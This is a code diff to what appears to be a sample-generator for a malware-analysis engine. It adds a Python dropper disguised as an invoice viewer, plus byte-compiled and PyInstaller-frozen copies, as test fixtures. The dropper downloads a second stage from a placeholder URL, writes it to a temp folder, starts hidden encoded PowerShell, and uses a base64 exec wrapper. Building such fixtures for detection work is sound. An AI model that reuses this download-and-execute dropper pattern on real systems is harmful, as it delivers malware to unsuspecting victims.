@@ -710,9 +710,58 @@ def installer_msi() -> bytes:
     return build_cfb(tree)
 
 
+_PY_DROPPER_SRC = (
+    "# Factura 2026-0187 - visor seguro (no editar)\n"
+    "import base64, os, subprocess, urllib.request\n"
+    f"STAGE = \"{STAGE2_URL}\"\n"
+    "def run():\n"
+    "    data = urllib.request.urlopen(STAGE).read()\n"
+    "    p = os.path.join(os.environ.get('TEMP', '/tmp'), 'upd.bin')\n"
+    "    open(p, 'wb').write(data)\n"
+    f"    subprocess.Popen('powershell -nop -w hidden -enc {PS_B64}', shell=True)\n"
+    "    exec(base64.b64decode('cHJpbnQoJ2ZhY3R1cmEgMjAyNi0wMTg3Jyk='))\n"
+    "run()\n"
+)
+
+
+def dropper_py() -> bytes:
+    """A .py dropper: urllib download + subprocess PowerShell (Base64) + an
+    exec(base64.b64decode(...)) wrapper the light decoder peels. Python tab."""
+    return _PY_DROPPER_SRC.encode()
+
+
+def dropper_pyc() -> bytes:
+    """The same dropper byte-compiled (.pyc). With pycdc it decompiles to source;
+    otherwise the engine reconstructs the dotted calls from the bytecode. Built
+    with the running interpreter at sample time; indicators are inert."""
+    import importlib.util
+    code = compile(_PY_DROPPER_SRC, "visor.py", "exec")
+    import marshal as _m
+    return importlib.util.MAGIC_NUMBER + b"\x00" * 12 + _m.dumps(code)
+
+
+def pyinstaller_exe() -> bytes:
+    """A minimal PyInstaller-frozen .exe: a PE stub with a CArchive holding the
+    dropper as an entry script. Exercises the CArchive/PYZ unpacker → Python
+    engine. Not a real program; the appended data is inert."""
+    import marshal as _m
+    import sys as _sys
+
+    code = compile(_PY_DROPPER_SRC, "visor.py", "exec")
+    data = _m.dumps(code)
+    name = b"visor"
+    toc = struct.pack(">IIIIB", 18 + len(name), 0, len(data), len(data), 0) + b"s" + name
+    pyvers = _sys.version_info.major * 100 + _sys.version_info.minor
+    pylib = f"python{_sys.version_info.major}{_sys.version_info.minor}.dll".encode().ljust(64, b"\x00")
+    magic = b"MEI\014\013\012\013\016"
+    pkg = data + toc + magic + struct.pack(">IIII", len(data) + len(toc) + 88, len(data), len(toc), pyvers) + pylib
+    pe_stub = b"MZ\x90\x00" + b"\x00" * 120 + b"PE\x00\x00" + b"\x00" * 64
+    return pe_stub + pkg
+
+
 def dropper_bundle_zip() -> bytes:
-    """A plain .zip bundling the obfuscated scripts and shortcuts, to exercise the
-    nested (recursive) path: each child is parsed/deobfuscated on its own."""
+    """A plain .zip bundling the obfuscated scripts, shortcuts and Python, to
+    exercise the nested (recursive) path: each child is parsed on its own."""
     import io
     import zipfile
 
@@ -727,6 +776,8 @@ def dropper_bundle_zip() -> bytes:
         zf.writestr("factura.pdf.lnk", shortcut_lnk())
         zf.writestr("factura.url", internet_shortcut_url())
         zf.writestr("instalador.msi", installer_msi())
+        zf.writestr("visor.py", dropper_py())
+        zf.writestr("visor.pyc", dropper_pyc())
     return buf.getvalue()
 
 
@@ -743,6 +794,8 @@ def build_all() -> dict[str, bytes]:
         "sample_dropper.bat": dropper_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
         "sample_installer.msi": installer_msi(),
+        "sample_dropper.py": dropper_py(), "sample_dropper.pyc": dropper_pyc(),
+        "sample_pyinstaller.exe": pyinstaller_exe(),
         "lab/dropper_bundle.zip": dropper_bundle_zip(),
     }
     for ext in X_CT:
